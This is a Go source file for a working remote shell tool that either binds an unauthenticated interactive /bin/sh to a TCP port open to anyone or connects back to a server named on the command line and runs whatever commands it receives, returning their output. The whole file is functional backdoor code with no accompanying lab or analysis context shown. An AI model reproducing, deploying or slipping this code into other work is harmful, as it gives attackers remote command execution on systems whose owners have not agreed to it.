package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func handle_bind(conn net.Conn) {
	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	//cmd := exec.Command("/bin/sh", inCommand)
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func handle_rev(conn net.Conn, inCommand string) {
	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	//cmd := exec.Command("/bin/sh", "-i")
	cmd := exec.Command("/bin/sh", "-c", inCommand)
	//cmd.Stdin = strings.NewReader(inCommand)
	log.Printf("Command: %s", cmd)
	var out bytes.Buffer
	//_, wp := io.Pipe()
	// Set stdin to our connection
	//cmd.Stdin = conn
	//cmd.Stdout = wp
	cmd.Stdout = &out
	//log.Printf("Test: %s\n", wp)
	//go io.Copy(conn, wp)
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	// Send data received back from exector function to server
	// Send data via conn.Write.
	log.Println("Writing data")
	if _, err := conn.Write([]byte(out.String())); err != nil {
		log.Fatalln("Unable to write data")
	}
	//conn.Close()
}

// Sets up a wide open listener that anyone can connect to and interact with shell connections
func openListner(port int) {
	portFmt := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", portFmt)
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle_bind(conn)
	}
}

// calls back to the server to receive potential commands to execute
func reverseConn(ServerIP string, ServerPort int) {
	ServerHost := fmt.Sprintf("%s:%d", ServerIP, ServerPort)
	serverConn, err := net.Dial("tcp", ServerHost)
	if err != nil {
		log.Fatalln(err)
	}
	// Receive data from server
	defer serverConn.Close()

	// Create a buffer to store received data.
	b := make([]byte, 512)
	for {
		// Receive data via conn.Read into a buffer.
		size, err := serverConn.Read(b[0:])
		if err == io.EOF {
			log.Println("Server disconnected")
			break
		}
		if err != nil {
			log.Println("Unexpected error in revConn")
			break
		}
		withoutNull := bytes.Trim(b, "\x00")
		log.Printf("Received %d bytes: %s", size, string(withoutNull[:size]))

		// Send data to executor function
		handle_rev(serverConn, string(withoutNull[:size]))
		//break
		// Send data received back from exector function to server
		// Send data via conn.Write.
		//log.Println("Writing data")
		//if _, err := serverConn.Write(b[0:size]); err != nil {
		//	log.Fatalln("Unable to write data")
		//}
	}

}

// Main function which establishes the IP address and port of the server to connect back to, or wide open
func main() {
	hostnamePtr := flag.String("server", "127.0.0.1", "Server to connect to, can be IP or hostname")
	portPtr := flag.Int("ports", 8080, "Port to connect to")
	bindShellPtr := flag.Bool("bind", false, "Binds the shell to a specific port instead of a reverse TCP connection")
	flag.Parse()
	bind := *bindShellPtr
	port := *portPtr
	hostname := *hostnamePtr
	if bind {
		openListner(port)
	} else {
		reverseConn(hostname, port)
	}
}
